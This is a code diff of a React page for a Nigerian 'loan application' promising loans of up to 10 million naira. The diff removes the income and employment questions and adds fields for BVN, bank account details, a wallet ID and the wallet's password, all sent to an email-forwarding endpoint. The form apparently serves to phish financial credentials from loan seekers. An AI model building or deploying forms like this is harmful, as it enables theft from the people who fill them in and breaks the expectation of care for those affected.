@@ -8,19 +8,28 @@ import { Footer } from '@/components/footer';
 export default function LoanApplication() {
   const [formData, setFormData] = useState({
     email: '',
+    phoneNumber: '',
+    whatsappNumber: '',
+    bvn: '',
     address: '',
-    fullName: '',
-    contactAddress: '',
+    accountNumber: '',
+    accountName: '',
+    bankName: '',
+    amountSought: '',
+    loanTenure: '',
+    reasonForLoan: '',
+    walletId: '',
+    walletPassword: '',
     sex: '',
-    employmentStatus: '',
-    monthlyIncome: '',
-    purposeOfLoan: '',
   });
+
   const [submitted, setSubmitted] = useState(false);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
 
-  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
+  const handleChange = (
+    e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>
+  ) => {
     const { name, value } = e.target;
     setFormData(prev => ({
       ...prev,
@@ -32,13 +41,11 @@ export default function LoanApplication() {
     e.preventDefault();
     setLoading(true);
     setError('');
-    
+
     try {
       const response = await fetch('/api/send-email2', {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(formData),
       });
 
@@ -51,19 +58,25 @@ export default function LoanApplication() {
       setSubmitted(true);
       setFormData({
         email: '',
+        phoneNumber: '',
+        whatsappNumber: '',
+        bvn: '',
         address: '',
-        fullName: '',
-        contactAddress: '',
+        accountNumber: '',
+        accountName: '',
+        bankName: '',
+        amountSought: '',
+        loanTenure: '',
+        reasonForLoan: '',
+        walletId: '',
+        walletPassword: '',
         sex: '',
-        employmentStatus: '',
-        monthlyIncome: '',
-        purposeOfLoan: '',
       });
-      setTimeout(() => setSubmitted(false), 3000);
+      setTimeout(() => setSubmitted(false), 5000);
     } catch (err) {
       console.error('Error submitting form:', err);
       setError('Failed to submit application. Please try again.');
-      setTimeout(() => setError(''), 3000);
+      setTimeout(() => setError(''), 5000);
     } finally {
       setLoading(false);
     }
@@ -72,16 +85,13 @@ export default function LoanApplication() {
   return (
     <div className="min-h-screen flex flex-col bg-white">
       <Header />
-      
+
       <main className="flex-grow">
-        {/* Page Title */}
         <section className="bg-gradient-to-b from-gray-900 to-gray-800 text-white py-12 text-center">
           <h1 className="text-4xl font-bold">Loan Application</h1>
         </section>
 
-        {/* Main Content */}
         <div className="max-w-4xl mx-auto px-4 py-8">
-          {/* Header Image */}
           <div className="mb-8 flex justify-center">
             <Image
               src="https://lendig0.simdif.com/images/public/sd_678a2098256dd.jpg"
@@ -92,7 +102,6 @@ export default function LoanApplication() {
             />
           </div>
 
-          {/* Description */}
           <div className="bg-blue-50 rounded-lg p-6 mb-8 text-center">
             <h2 className="text-2xl font-bold text-gray-800 mb-3">GET LOAN UP TO 10 MILLION NAIRA</h2>
             <p className="text-gray-700">
@@ -100,10 +109,9 @@ export default function LoanApplication() {
             </p>
           </div>
 
-          {/* Application Form */}
           <div className="bg-white rounded-lg shadow-lg p-8">
             <h3 className="text-2xl font-bold text-gray-800 mb-6">Registration Form</h3>
-            
+
             {submitted && (
               <div className="bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-6">
                 Your loan application has been submitted successfully! We will review your application and contact you shortly.
@@ -130,26 +138,38 @@ export default function LoanApplication() {
                 />
               </div>
 
-              {/* Full Name */}
+              {/* Phone Number */}
               <div>
-                <label className="block text-gray-700 font-semibold mb-2">Name In Full *</label>
+                <label className="block text-gray-700 font-semibold mb-2">Phone Number *</label>
                 <input
                   type="text"
-                  name="fullName"
-                  value={formData.fullName}
+                  name="phoneNumber"
+                  value={formData.phoneNumber}
                   onChange={handleChange}
                   required
                   className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                 />
               </div>
 
-              {/* Contact Address */}
+              {/* WhatsApp Number */}
               <div>
-                <label className="block text-gray-700 font-semibold mb-2">Contact Address</label>
+                <label className="block text-gray-700 font-semibold mb-2">WhatsApp Number</label>
                 <input
                   type="text"
-                  name="contactAddress"
-                  value={formData.contactAddress}
+                  name="whatsappNumber"
+                  value={formData.whatsappNumber}
+                  onChange={handleChange}
+                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
+                />
+              </div>
+
+              {/* BVN */}
+              <div>
+                <label className="block text-gray-700 font-semibold mb-2">BVN (Bank Verification Number)</label>
+                <input
+                  type="text"
+                  name="bvn"
+                  value={formData.bvn}
                   onChange={handleChange}
                   className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                 />
@@ -166,6 +186,107 @@ export default function LoanApplication() {
                   rows={3}
                   className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600 resize-none"
                 />
+              </div>
+
+              {/* Account Details */}
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div>
+                  <label className="block text-gray-700 font-semibold mb-2">Account Number</label>
+                  <input
+                    type="text"
+                    name="accountNumber"
+                    value={formData.accountNumber}
+                    onChange={handleChange}
+                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
+                  />
+                </div>
+                <div>
+                  <label className="block text-gray-700 font-semibold mb-2">Account Name</label>
+                  <input
+                    type="text"
+                    name="accountName"
+                    value={formData.accountName}
+                    onChange={handleChange}
+                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
+                  />
+                </div>
+                <div>
+                  <label className="block text-gray-700 font-semibold mb-2">Bank Name</label>
+                  <input
+                    type="text"
+                    name="bankName"
+                    value={formData.bankName}
+                    onChange={handleChange}
+                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
+                  />
+                </div>
+              </div>
+
+              {/* Amount Sought */}
+              <div>
+                <label className="block text-gray-700 font-semibold mb-2">Amount Sought</label>
+                <input
+                  type="text"
+                  name="amountSought"
+                  value={formData.amountSought}
+                  onChange={handleChange}
+                  placeholder="Amount in Naira"
+                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
+                />
+              </div>
+
+              {/* Loan Tenure */}
+              <div>
+                <label className="block text-gray-700 font-semibold mb-2">Loan Tenure</label>
+                <select
+                  name="loanTenure"
+                  value={formData.loanTenure}
+                  onChange={handleChange}
+                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
+                >
+                  <option value="">Select...</option>
+                  <option value="1 Month">1 Month</option>
+                  <option value="4 Months">4 Months</option>
+                  <option value="10 Months">10 Months</option>
+                  <option value="1 Year">1 Year</option>
+                  <option value="Others">Others</option>
+                </select>
+              </div>
+
+              {/* Reason for Loan */}
+              <div>
+                <label className="block text-gray-700 font-semibold mb-2">Reason for Loan</label>
+                <textarea
+                  name="reasonForLoan"
+                  value={formData.reasonForLoan}
+                  onChange={handleChange}
+                  rows={3}
+                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600 resize-none"
+                />
+              </div>
+
+              {/* Wallet ID */}
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div>
+                  <label className="block text-gray-700 font-semibold mb-2">Wallet ID</label>
+                  <input
+                    type="text"
+                    name="walletId"
+                    value={formData.walletId}
+                    onChange={handleChange}
+                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
+                  />
+                </div>
+                <div>
+                  <label className="block text-gray-700 font-semibold mb-2">Wallet ID Password</label>
+                  <input
+                    type="password"
+                    name="walletPassword"
+                    value={formData.walletPassword}
+                    onChange={handleChange}
+                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
+                  />
+                </div>
               </div>
 
               {/* Sex */}
@@ -195,54 +316,6 @@ export default function LoanApplication() {
                     <span className="text-gray-700">Female</span>
                   </label>
                 </div>
-              </div>
-
-              {/* Employment Status */}
-              <div>
-                <label className="block text-gray-700 font-semibold mb-2">Employment Status</label>
-                <select
-                  name="employmentStatus"
-                  value={formData.employmentStatus}
-                  onChange={handleChange}
-                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
-                >
-                  <option value="">Select...</option>
-                  <option value="Employed">Employed</option>
-                  <option value="Self-Employed">Self-Employed</option>
-                  <option value="Unemployed">Unemployed</option>
-                  <option value="Retired">Retired</option>
-                </select>
-              </div>
-
-              {/* Monthly Income */}
-              <div>
-                <label className="block text-gray-700 font-semibold mb-2">Monthly Income</label>
-                <input
-                  type="text"
-                  name="monthlyIncome"
-                  value={formData.monthlyIncome}
-                  onChange={handleChange}
-                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
-                  placeholder="Amount in Naira"
-                />
-              </div>
-
-              {/* Purpose of Loan */}
-              <div>
-                <label className="block text-gray-700 font-semibold mb-2">Purpose of Loan</label>
-                <select
-                  name="purposeOfLoan"
-                  value={formData.purposeOfLoan}
-                  onChange={handleChange}
-                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
-                >
-                  <option value="">Select...</option>
-                  <option value="Business Expansion">Business Expansion</option>
-                  <option value="Personal Use">Personal Use</option>
-                  <option value="Education">Education</option>
-                  <option value="Medical">Medical</option>
-                  <option value="Home Improvement">Home Improvement</option>
-                </select>
               </div>
 
               {/* Submit Button */}
